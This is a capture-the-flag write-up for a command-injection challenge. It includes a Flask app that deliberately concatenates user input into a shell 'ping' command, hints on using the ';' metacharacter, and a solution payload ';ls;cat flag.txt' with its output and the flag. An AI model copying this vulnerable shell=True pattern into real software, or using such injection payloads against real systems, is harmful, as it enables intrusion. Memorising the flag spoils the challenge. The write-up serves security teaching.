# Command Injection
Are you too lazy to ping websites? Then just use this convenient cloud service to ping sites for you!

url> `http://forever.isss.io:4223`


## Hints

- Based on the output or the source code, you might recognize that this webapp is running the command line utility `ping`. In the source code, you can see that the variable `command` is formed by directly concatenating user input with the ping command
- Thus, you can use different command line metacharacters to run other commands. For instance, you could exploit the `;` metacharacter by entering this: `google.com; echo hello`
- The flag is stored at /flag.txt. You just need to figure out how to read the file by injecting a command!


- app.py
```python
from flask import *
import subprocess
app = Flask(__name__)

@app.route('/', methods=['POST','GET'])
def index():
    if request.method == 'POST':
        url = request.form.get('url')
        if not url is None:
            command = 'ping -c 1 '+url
            p = subprocess.run(command, shell=True, capture_output=True)
            content = p.stdout.decode('ascii')
            return render_template('index.html', content=content)
    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0')

```

## Solucion

```
;ls;cat flag.txt
`Dockerfile README.md app.py docker-compose.yaml flag.txt requirements.txt static templates utflag{c0mmand_1nj3ct3d!}`
```